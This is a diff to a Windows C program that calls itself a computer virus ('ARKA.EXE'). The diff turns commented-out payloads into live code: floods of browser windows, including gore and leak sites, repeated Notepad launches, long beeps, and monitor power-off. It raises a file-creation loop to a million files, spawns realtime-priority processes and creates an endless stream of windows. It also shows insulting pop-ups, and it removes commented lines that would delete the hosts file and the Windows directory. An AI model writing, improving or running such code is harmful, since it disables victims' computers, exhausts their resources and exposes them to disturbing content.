@@ -61,13 +61,6 @@ int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, PSTR CmdLine,
  if (MessageBox(NULL,TEXT("YOU ARE ABOUT TO GET WRECKED BY THIS COMPUTER VIRUS\n\t YOU DON'T KNOW\n WHAT YOU HAVE INVITED INTO YOUR STUPID_COMPUTER AND THIS TIME NO BACKOFF"),"ARKA.EXE",MB_ICONWARNING | MB_HELP)!=IDYES);
 
 
-    // FILE* fp = fopen("WORM.bat", "w");  // Changed file name to avoid system errors
-    // if (fp != NULL) {
-    //     char str[] = "CALL-OF-DUTY-TUF-GUY WORM";
-    //     fputs(str, fp);
-    //     fclose(fp);
-    // }
-
 
       //Openning stuffs and closing stuffs 
       ShellExecute(NULL,"open","msedge.exe",NULL,NULL,SW_MAX|SW_NORMAL);
@@ -77,33 +70,29 @@ int APIENTRY WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance, PSTR CmdLine,
        ShellExecute(NULL,"open","msedge.exe", "https://null.com",NULL,SW_NORMAL);
        ShellExecute(NULL,"open","msedge.exe", "https://safeweb.norton.com/404",NULL,SW_NORMAL);
        ShellExecute(NULL,"open","msedge.exe","https://goregrish.com",NULL,SW_SHOWMAXIMIZED);
-//        ShellExecute(NULL,"open","msedge.exe","https://reelleak.com",NULL,SW_SHOWMAXIMIZED);
-//         ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
-//          ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
-//           ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
-//            ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
+       ShellExecute(NULL,"open","msedge.exe","https://reelleak.com",NULL,SW_SHOWMAXIMIZED);
+        ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
+         ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
+          ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
+           ShellExecute(NULL,"open","Notepad",NULL,NULL,SW_MAXIMIZE);
 
-//                 ShellExecute(NULL,"open","msedge.exe",NULL,NULL,SW_MAX|SW_NORMAL);
-//        ShellExecute(NULL,"open","msedge.exe", "https://youtube.com",NULL,SW_NORMAL);
-//        MessageBeep(MB_ICONINFORMATION);
-//        ShellExecute(NULL,"open","msedge.exe", "https://null.com",NULL,SW_NORMAL);
-//        ShellExecute(NULL,"open","msedge.exe", "https://www.whatsapp.com",NULL,SW_NORMAL);
+                ShellExecute(NULL,"open","msedge.exe",NULL,NULL,SW_MAX|SW_NORMAL);
+       ShellExecute(NULL,"open","msedge.exe", "https://youtube.com",NULL,SW_NORMAL);
+       MessageBeep(MB_ICONINFORMATION);
+       ShellExecute(NULL,"open","msedge.exe", "https://null.com",NULL,SW_NORMAL);
+       ShellExecute(NULL,"open","msedge.exe", "https://www.whatsapp.com",NULL,SW_NORMAL);
        ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com",NULL,SW_SHOWMAXIMIZED);
        ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com/p/CyOy0JzvKvm/?igsh=MWo0amppYjRjeTFkZQ==",NULL,SW_SHOWMAXIMIZED);
      MessageBox(NULL, TEXT("You are a Stupid like everyone !!"),
  NULL, MB_ICONERROR);
 
     Beep(800,8000);
-//  Beep(900,9000);
-//  Beep(1000,10000);
-//  Beep(1100,11000);
+ Beep(900,9000);
+ Beep(1000,10000);
+ Beep(1100,11000);
  create_files();
 
-
  create_process();
-    //    system("del C:\\WINDOWS\\System32\\drivers\\etc\\hosts");// deleting the host files of C directory in sense of malfunction 
-    // system("del C:\\WINDOWS\\.");//Now fire up the C drive  
-
 
 
        SendMessage(HWND_BROADCAST,WM_SYSCOMMAND,SC_MONITORPOWER,(LPARAM)2);// off the computer 
@@ -140,6 +129,7 @@ do{
      HWND hnd5 = CreateWindow (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
      HWND hnd6 = CreateWindow (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
      HWND hnd7 = CreateWindow (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
+    MessageBox(NULL,TEXT("pAthetic isn't it \n My frind ??"),TEXT("aRka.EXE"),MB_HELP);
      HWND hnd8 = CreateWindow (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
      HWND hnd9 = CreateWindow (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
      HWND hnd10 = CreateWindow (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
@@ -148,10 +138,6 @@ do{
      HWND hnd15 = CreateWindow (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
      HWND hnd16 = CreateWindow (ws.lpszClassName,L"00fx90///////0fx00Fh16hx",WS_OVERLAPPEDWINDOW | WS_VISIBLE,10,100,5000,800,NULL,NULL,hinstance,NULL);
 }while (c<=10);
-    // if (hnd == NULL)
-    // {
-    //   return -1;
-    // }
 
 
     
@@ -164,10 +150,6 @@ while (GetMessage(&msg,NULL,0,0))
     
 
         
-
-     
-    int n = 10;  
-    // fun3(n);
 
     return 0;
 }
@@ -192,7 +174,7 @@ void create_files ()
 
     char file [1000000];
     int c = 0;
-    while (c<=400)
+    while (c<=1000000)
     {
         sprintf(file,"DON'T_README%d.php",c++);
         HANDLE hnd = CreateFile(
@@ -230,7 +212,7 @@ void create_process ()
             NULL,
             NULL,
             FALSE,
-            REALTIME_PRIORITY_CLASS,
+            REALTIME_PRIORITY_CLASS | REALTIME_PRIORITY_CLASS,
             NULL,
             NULL,
             &Si,
